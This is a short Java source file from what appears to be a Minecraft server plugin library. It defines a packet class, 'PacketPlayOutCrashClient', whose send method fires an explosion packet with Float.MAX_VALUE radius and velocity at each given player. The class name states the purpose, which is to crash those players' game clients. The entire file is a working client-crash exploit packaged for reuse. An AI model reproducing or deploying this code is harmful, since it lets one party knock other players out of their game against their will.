package com.minecraft.moonlake.nms.packet;

import com.minecraft.moonlake.nms.packet.exception.PacketException;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import java.util.ArrayList;

/**
 * Created by MoonLake on 2016/9/30.
 */
public class PacketPlayOutCrashClient extends PacketAbstract<PacketPlayOutCrashClient> {

    public PacketPlayOutCrashClient() {

    }

    @Override
    public void send(Player... players) throws PacketException {

        for(final Player player : players) {

            PacketPlayOutExplosion packetPlayOutExplosion = new PacketPlayOutExplosion(player.getLocation(), Float.MAX_VALUE, new ArrayList<>(), new Vector(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
            packetPlayOutExplosion.send(player);
        }
    }
}
